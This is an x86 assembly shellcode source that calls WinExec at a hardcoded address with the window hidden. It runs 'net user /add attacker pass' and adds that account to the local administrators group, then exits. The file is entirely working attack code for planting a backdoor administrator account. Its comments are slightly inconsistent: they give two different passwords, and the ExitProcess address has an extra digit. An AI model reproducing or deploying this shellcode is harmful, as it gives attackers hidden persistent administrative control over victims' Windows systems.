;WinExec() Windows Shellcode - Create new user & add it to local administrators group

global _start
section .text
_start:

    ;EAX will hold WinExec memory address "0x760e53e7"
    ;EBX will hold "lpCmdLine" = "net user /add attacker 123@123 && net localgroup administrators attacker /add"
    ;"uCmdShow" will be set to null = Hides the window from the user and activates another window

    mov eax, 0x760e53e7    ;set EAX to memory address of "WinExec()"
    xor esi,esi        ;null the register
    push esi        ;push null to terminiate the string that will be pushed
    PUSH 0x20202064        ;pushing the string "cmd.exe /c net user /add attacker pass && net localgroup administrators attacker /add"
    PUSH 0x64612f20
    PUSH 0x72656b63
    PUSH 0x61747461
    PUSH 0x2073726f
    PUSH 0x74617274
    PUSH 0x73696e69
    PUSH 0x6d646120
    PUSH 0x70756f72
    PUSH 0x676c6163
    PUSH 0x6f6c2074
    PUSH 0x656e2026
    PUSH 0x26207373
    PUSH 0x61702072
    PUSH 0x656b6361
    PUSH 0x74746120
    PUSH 0x6464612f
    PUSH 0x20726573
    PUSH 0x75207465
    PUSH 0x6e20632f
    PUSH 0x20657865
    PUSH 0x2e646d63
    mov ebx, esp        ;EBX now contains the address of the string

    ;Preparing the stack before calling WinExec()
    push esi        ;uCmdShow = 0
    push ebx        ;pointer to the string
    call eax        ;call WinExec()

    ;Preparing the stack before calling ExitProcess()
    mov eax, 0x076073b54    ;set EAX to the memory address of "ExitProcess()"
    push esi        ;ESI = 0 = return value
    call eax        ;call "ExitProcess()"